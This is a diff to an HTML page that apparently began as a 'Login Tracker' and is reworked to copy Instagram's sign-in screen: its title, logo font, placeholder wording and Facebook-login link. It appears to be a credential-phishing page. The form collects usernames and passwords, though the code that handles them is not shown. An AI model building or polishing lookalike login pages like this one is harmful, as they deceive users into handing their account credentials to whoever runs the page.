@@ -3,19 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Tracker</title>
+    <title>Instagram Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <h1>Instagram</h1>
+        <div class="logo">Instagram</div>
         <form id="login-form">
-            <input type="text" id="username" placeholder="Enter Username" required>
-            <input type="password" id="password" placeholder="Enter Password" required>
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log in</button>
-            <p>OR</p>
-            <button class="facebook-button">Log in with Facebook</button>
-            <a href="#">Forgot password?</a>
+            <div class="or">OR</div>
+            <a href="#" class="facebook-login">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
+              Log in with Facebook
+          </a>
+          <a href="#" class="forgot-password">Forgot password?</a>
         </form>
         <p id="message"></p>
     </div>
